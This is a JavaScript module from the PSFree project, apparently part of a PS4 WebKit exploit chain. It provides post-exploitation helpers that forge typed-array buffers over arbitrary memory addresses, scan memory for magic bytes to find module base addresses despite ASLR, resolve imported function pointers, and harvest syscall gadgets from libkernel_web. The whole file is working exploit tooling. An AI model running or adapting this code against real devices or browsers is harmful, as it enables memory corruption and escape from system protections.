/* Copyright (C) 2023 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// This module are for utilities that depend on running the exploit first

import { Int } from './int64.mjs';
import { Addr, mem } from './mem.mjs';
import { align } from './utils.mjs';
import { KB } from './constants.mjs';
import { read32 } from './rw.mjs';

import * as rw from './rw.mjs';
import * as o from './offset.mjs';

export function make_buffer(addr, size) {
    // see enum TypedArrayMode from
    // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
    // at webkitgtk 2.34.4
    //
    // views with m_mode < WastefulTypedArray don't have a ArrayBuffer object
    // associated with them, if we ask for view.buffer, it will be created on
    // the fly
    const mode_fast = 0;
    const u = new Uint8Array(1);
    const u_addr = mem.addrof(u);

    u_addr.write64(o.view_m_vector, addr);
    u_addr.write32(o.view_m_length, size);
    // force mode to FastTypedArray
    u_addr.write32(o.view_m_mode, mode_fast);

    return u.buffer;
}

function eq(a, b) {
    return (a.low() === b.low()) && (a.high() === b.high());
}

// these values came from analyzing dumps from CelesteBlue
function check_magic_at(p, is_text) {
    // byte sequence that is very likely to appear at offset 0 of a .text
    // segment
    const text_magic = [
        new Int([0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56]),
        new Int([0x41, 0x55, 0x41, 0x54, 0x53, 0x50, 0x48, 0x8d]),
    ];

    // the .data "magic" is just a portion of the PT_SCE_MODULE_PARAM segment

    // .data magic from 3.00, 6.00, and 6.20
    //const data_magic = [
    //    new Int(0x18),
    //    new Int(0x3c13f4bf, 0x1),
    //];

    // .data magic from 8.00 and 8.03
    const data_magic = [
        new Int(0x20),
        new Int(0x3c13f4bf, 0x2),
    ];

    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)];

    return eq(value[0], magic[0]) && eq(value[1], magic[1]);
}

// Finds the base address of a segment: .text or .data
// Used on the ps4 to locate module base addresses
// * p:
//     an address pointing somewhere in the segment to search
// * is_text:
//     whether the segment is .text or .data
// * is_back:
//     whether to search backwards (to lower addresses) or forwards
//
// Modules are likely to be separated by a couple of unmapped pages because of
// Address Space Layout Randomization (all module base addresses are
// randomized). This means that this function will either succeed or crash on
// a page fault, if the magic is not present.
//
// To be precise, modules are likely to be "surrounded" by unmapped pages, it
// does not mean that the distance between a boundary of a module and the
// nearest unmapped page is 0.
//
// The boundaries of a module is its base and end addresses.
//
// let module_base_addr = find_base(...);
// // Not guaranteed to crash, the nearest unmapped page is not necessarily at
// // 0 distance away from module_base_addr.
// addr.read8(-1);
//
export function find_base(addr, is_text, is_back) {
    // ps4 page size
    const page_size = 16 * KB;
    // align to page size
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;
    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset)
    }
    return addr;
}

// gets the address of the underlying buffer of a JSC::JSArrayBufferView
export function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) {
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    return mem.addrof(view).readp(o.view_m_vector);
}

export function resolve_import(import_addr) {
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(
            `instruction at ${import_addr} is not of the form: jmp qword`
            + ' [rip + X]'
        );
    }
    // module_function_import:
    //     jmp qword [rip + X]
    //     ff 25 xx xx xx xx // signed 32-bit displacement
    const disp = import_addr.read32(2);
    // sign extend
    const offset = new Int(disp, disp >> 31);
    // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
    // of the next instruction. This means that the actual address used is
    // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
    // jump instruction, which is 6 in this case.
    const function_addr = import_addr.add(offset.add(6)).readp(0);

    return function_addr;
}

export function init_syscall_array(
    syscall_array,
    libkernel_web_base,
    max_search_size,
) {
    if (typeof max_search_size !== 'number') {
        throw TypeError(`max_search_size is not a number: ${max_search_size}`);
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }

    // 'rdlo' string from libkernel_web's .rodata section
    const str = 0x6f6c6472;
    const libkernel_web_buffer = make_buffer(
        libkernel_web_base,
        max_search_size,
    );

    // Search for the string as to gain a upper bound on the size of the .text
    // section.
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        if (libkernel_web_base.read32(i) === str) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(
            '"rdlo" string not found in libkernel_web, base address:'
            + ` ${libkernel_web_base}`
        );
    }

    // search for the instruction sequence:
    // syscall_X:
    //     mov rax, X
    //     mov r10, rcx
    //     syscall
    const kbuf = new Uint8Array(libkernel_web_buffer);
    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48
            && kbuf[i + 1] === 0xc7
            && kbuf[i + 2] === 0xc0
            && kbuf[i + 7] === 0x49
            && kbuf[i + 8] === 0x89
            && kbuf[i + 9] === 0xca
            && kbuf[i + 10] === 0x0f
            && kbuf[i + 11] === 0x05
        ) {
            const syscall_num = read32(kbuf, i + 3);
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            // skip the sequence
            i += 12;
        }
    }
}
